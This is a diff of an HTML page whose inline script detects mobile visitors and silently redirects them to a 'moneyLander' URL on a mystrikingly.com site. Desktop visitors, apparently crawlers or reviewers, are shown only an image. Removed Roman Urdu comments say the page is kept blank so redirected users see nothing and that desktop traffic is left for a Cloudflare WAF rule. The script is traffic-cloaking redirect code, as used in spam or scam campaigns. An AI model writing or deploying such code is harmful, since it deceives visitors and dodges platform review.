@@ -10,26 +10,26 @@
     <meta property="og:type" content="website">
 
     <script>
-        // Redirect Logic ko bilkul shuru mein rakha hai taake image load hone se pehle hi action ho
         (function() {
             const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
-            const ua = navigator.userAgent.toLowerCase();
             const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-            const isDesktop = !hasTouch || window.innerWidth > 490;
+            const isMobile = window.innerWidth <= 490;
 
-            // Agar Mobile hai, toh seedha lander pe bhejo
-            if (hasTouch && window.innerWidth <= 490) {
+            if (hasTouch && isMobile) {
                 window.location.replace(moneyLander);
-            } 
-            // Agar Desktop hai, toh redirect MAT karo.
-            // Jab code yahan ruk jayega, tab Cloudflare ka WAF rule trigger hoga.
-            else {
-                console.log("Waiting for WAF");
             }
         })();
     </script>
 </head>
-<body style="background-color: #ffffff;">
-    <!-- Body khaali rakhi hai taake redirect hone wale ko kuch na dikhe -->
+<body style="background-color: #ffffff; margin: 0; padding: 0; text-align: center;">
+
+    <!-- Image ko JS se control kiya hai -->
+    <script>
+        // Sirf tab dikhegi jab redirect nahi hoga (yani Desktop/Captcha case mein)
+        if (!('ontouchstart' in window) || window.innerWidth > 490) {
+            document.write('<img src="https://i.postimg.cc/nLFxDC2Q/482294128736867509.jpg" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">');
+        }
+    </script>
+
 </body>
 </html>
